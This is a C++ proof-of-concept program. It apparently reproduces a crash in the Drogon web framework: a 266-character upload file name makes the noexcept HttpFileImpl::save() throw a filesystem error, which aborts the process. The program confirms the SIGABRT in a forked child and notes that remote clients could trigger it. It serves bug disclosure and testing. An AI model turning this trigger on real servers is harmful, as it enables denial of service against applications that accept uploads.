#include <iostream>
#include <filesystem>
#include <fstream>
#include <cassert>
#include <cstring>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <drogon/HttpAppFramework.h>
#include "HttpFileImpl.h"

namespace fs = std::filesystem;

void runLongFilenameTest(const fs::path &uploadDir)
{
    drogon::HttpFileImpl file;
    // An uploaded file whose name component exceeds OS limit (NAME_MAX=255)
    // or triggers OS filesystem error during weakly_canonical / exists.
    std::string longName(266, 't');
    file.setFileName(longName);
    const char dummy[] = "TEST_PAYLOAD";
    file.setFile(dummy, sizeof(dummy));

    // HttpFileImpl::save is declared noexcept.
    // It invokes std::filesystem::weakly_canonical() without std::error_code.
    // The filesystem throws std::filesystem_error, which cannot escape noexcept,
    // causing immediate std::terminate() and process abortion.
    file.save(uploadDir.string());
}

int main()
{
    std::cout << "[*] Investigating unhandled std::filesystem_error in noexcept HttpFileImpl::save()...\n";
    std::cout << "    Target: drogon::HttpFileImpl::save(const std::string &path) const noexcept\n";

    fs::path tempBase = fs::temp_directory_path() / ("drogon_fs_test_" + std::to_string(::getpid()));
    fs::path uploadDir = tempBase / "uploads";
    std::error_code ec;
    fs::create_directories(uploadDir, ec);

    int pipeFds[2];
    if (::pipe(pipeFds) < 0)
    {
        std::cerr << "[-] Error: pipe() failed!\n";
        fs::remove_all(tempBase, ec);
        return 1;
    }

    pid_t pid = ::fork();
    if (pid < 0)
    {
        std::cerr << "[-] Fork failed!\n";
        return 1;
    }

    if (pid == 0)
    {
        ::close(pipeFds[0]);
        ::dup2(pipeFds[1], STDERR_FILENO);
        ::close(pipeFds[1]);

        runLongFilenameTest(uploadDir);
        _exit(0);
    }

    ::close(pipeFds[1]);
    char errBuffer[4096] = {0};
    ssize_t bytesRead = ::read(pipeFds[0], errBuffer, sizeof(errBuffer) - 1);
    ::close(pipeFds[0]);

    int status = 0;
    ::waitpid(pid, &status, 0);
    fs::remove_all(tempBase, ec);

    std::cout << "\n--- Child Process Diagnostic ---\n";
    if (bytesRead > 0)
    {
        std::cout << errBuffer << "\n";
    }

    if (WIFSIGNALED(status))
    {
        int sig = WTERMSIG(status);
        std::cout << "[!] RESULT: Child terminated with deadly signal " << sig << " (" << strsignal(sig) << ")\n";
        if (sig == SIGABRT)
        {
            std::cout << "[+] CONFIRMED: std::terminate() invoked due to uncaught std::filesystem_error in noexcept method!\n";
            std::cout << "    A remote client may trigger process termination in applications that expose multipart\n";
            std::cout << "    uploads and call HttpFile::save() or HttpFile::saveAs() on request-controlled paths without validating them.\n";
            return 0;
        }
    }
    else if (WIFEXITED(status))
    {
        int exitCode = WEXITSTATUS(status);
        std::cout << "[*] Child exited normally with code: " << exitCode << "\n";
    }

    return 0;
}

